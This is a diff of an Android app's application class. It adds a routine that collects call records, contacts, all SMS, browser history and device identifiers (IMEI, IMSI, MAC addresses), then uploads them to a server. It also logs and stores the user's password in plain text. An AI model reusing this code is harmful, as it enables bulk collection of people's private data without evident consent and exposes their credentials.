@@ -12,18 +12,31 @@ import com.thanone.palc.bean.Contacts;
 import com.thanone.palc.bean.Internet;
 import com.thanone.palc.bean.Location;
 import com.thanone.palc.bean.LocationBean;
+import com.thanone.palc.bean.Member;
 import com.thanone.palc.bean.Messages;
 import com.thanone.palc.bean.PhoneInfo;
 import com.thanone.palc.service.LocationService;
 import com.thanone.palc.util.HttpUrlUtil;
+import com.thanone.palc.util.UiUtil;
 import com.zcj.android.util.UtilAndroid;
 import com.zcj.android.util.UtilAppFile;
+import com.zcj.android.util.UtilContacts;
+import com.zcj.android.util.UtilInternet;
+import com.zcj.android.util.UtilMessage;
+import com.zcj.android.util.UtilSharedPreferences;
+import com.zcj.android.util.bean.CallRecordBean;
+import com.zcj.android.util.bean.ContactBean;
+import com.zcj.android.util.bean.InternetBean;
+import com.zcj.android.util.bean.MessageBean;
 import com.zcj.android.web.HttpCallback;
 import com.zcj.android.web.HttpUtilsHandler;
 import com.zcj.android.web.ServiceResult;
+import com.zcj.util.UtilString;
 
 import java.io.File;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 public class MyApplication extends Application {
 
@@ -34,6 +47,7 @@ public class MyApplication extends Application {
     public static final String XML_KEY_PASSWORD = "p";
 
     private Long loginUserId;
+    private Member loginUser;
 
     private String phoneId;// 手机编号
     private DbUtils dbUtils;// 数据库操作对象
@@ -89,26 +103,132 @@ public class MyApplication extends Application {
         }
     }
 
-    @SuppressWarnings("unused")
-    private void stopLocationService() {
+    public void stopLocationService() {
         if (locationService != null) {
             stopService(locationService);
             MyConfig.log("--stopLocationService");
         }
     }
 
-    /**
-     * 登录
-     */
-    public void login() {
-        loginUserId = 1212152184692736L;
+    // 保存账号信息到本地
+    public void saveUserInfo(String username, String password) {
+        MyConfig.log("开始保存登录的账号：" + username + ":" + password);
+        Map<String, String> linfo = new HashMap<String, String>();
+        linfo.put(MyApplication.XML_KEY_USERNAME, username);
+        linfo.put(MyApplication.XML_KEY_PASSWORD, password);
+        UtilSharedPreferences.save(this, MyApplication.XML_NAME, linfo);
+        MyConfig.log("保存账号成功");
     }
 
     /**
-     * 注销
+     * 读取各类信息到本地数据库（读取之前清理以前读取的 通讯录、通话记录、短信 数据），并上传至服务器
+     *
+     * @param callRecord 读取通话记录
+     * @param contacts   读取通讯录
+     * @param messages   读取短信
+     * @param internet   浏览器历史记录
+     * @param phoneInfo  读取手机参数
+     * @param location   读取位置信息
+     * @param showResult 执行完毕后是否弹出提示
      */
-    public void logout() {
-        loginUserId = null;
+    public void readInfoToDatebaseAndUpload(final boolean callRecord, final boolean contacts, final boolean messages, final boolean internet,
+                                    final boolean phoneInfo, final boolean location, final String showResult) {
+
+        MyConfig.log("开始读取手机数据并上传...");
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                String result = "";
+                List<CallRecord> callRecordList = null;
+                List<Contacts> contactsList = null;
+                List<Messages> messagesList = null;
+                List<Internet> internetList = null;
+                PhoneInfo pi = null;
+                Location loc = null;
+                if (location) {
+                    LocationBean.coverToLocation(getLastLocation());
+                }
+
+                if (callRecord) {
+                    try {
+                        MyConfig.log("开始读取通话记录");
+                        List<CallRecordBean> crb = UtilContacts.getCallRecord(MyApplication.this);
+                        if (crb != null && crb.size() > 0) {
+                            callRecordList = CallRecord.converByCallRecordBean(crb, getPhoneId());
+                        }
+                        result += "读取通话记录" + crb.size() + "条。";
+                    } catch (Exception e1) {
+                        e1.printStackTrace();
+                        result += "读取通话记录失败。";
+                    }
+                }
+                if (contacts) {
+                    try {
+                        MyConfig.log("开始读取通讯录");
+                        List<ContactBean> cb = UtilContacts.getContacts(MyApplication.this);
+                        if (cb != null && cb.size() > 0) {
+                            contactsList = Contacts.converByContactsBean(cb, getPhoneId());
+                        }
+                        result += "读取通讯录" + cb.size() + "条。";
+                    } catch (Exception e1) {
+                        e1.printStackTrace();
+                        result += "读取通讯录失败。";
+                    }
+                }
+                if (messages) {
+                    try {
+                        MyConfig.log("开始读取短信");
+                        List<MessageBean> mb = UtilMessage.getAllMessages(MyApplication.this);
+                        if (mb != null && mb.size() > 0) {
+                            messagesList = Messages.converByMessageBean(mb, getPhoneId());
+                        }
+                        result += "读取短信" + mb.size() + "条。";
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        result += "读取短信失败。";
+                    }
+                }
+                if (internet) {
+                    try {
+                        MyConfig.log("开始读取浏览器历史记录");
+                        List<InternetBean> ib = UtilInternet.getAllHostory(MyApplication.this);
+                        if (ib != null && ib.size() > 0) {
+                            internetList = Internet.converByInternetBean(ib, getPhoneId());
+                        }
+                        result += "读取浏览器历史记录" + ib.size() + "条。";
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        result += "读取浏览器历史记录失败。";
+                    }
+                }
+                if (phoneInfo) {
+                    try {
+                        MyConfig.log("开始读取手机参数");
+                        pi = new PhoneInfo();
+                        pi.setDeviceID(getPhoneId());
+                        pi.setImei(UtilAndroid.getIMEI(MyApplication.this));
+                        pi.setImsi(UtilAndroid.getIMSI(MyApplication.this));
+                        pi.setMacAddress(UtilAndroid.getMacAddress(MyApplication.this));
+                        pi.setBluetoothMacAddress(UtilAndroid.getBluetoothMacAddress());
+                        pi.setModel(UtilAndroid.getPhoneVersion());
+                        pi.setOs(UtilAndroid.getAndroidVersion());
+                        result += "读取手机参数成功。";
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                        result += "读取手机参数失败。";
+                    }
+                }
+
+                MyConfig.log(result);
+
+                if (UtilString.isNotBlank(showResult)) {
+                    UiUtil.alert(MyApplication.this, showResult);
+                }
+
+                uploadInfoToWeb(callRecordList, contactsList, messagesList, pi, loc, internetList);
+            }
+        }).start();
     }
 
     /**
@@ -555,5 +675,17 @@ public class MyApplication extends Application {
 
     public Long getLoginUserId() {
         return loginUserId;
+    }
+
+    public void setLoginUserId(Long loginUserId) {
+        this.loginUserId = loginUserId;
+    }
+
+    public Member getLoginUser() {
+        return loginUser;
+    }
+
+    public void setLoginUser(Member loginUser) {
+        this.loginUser = loginUser;
     }
 }
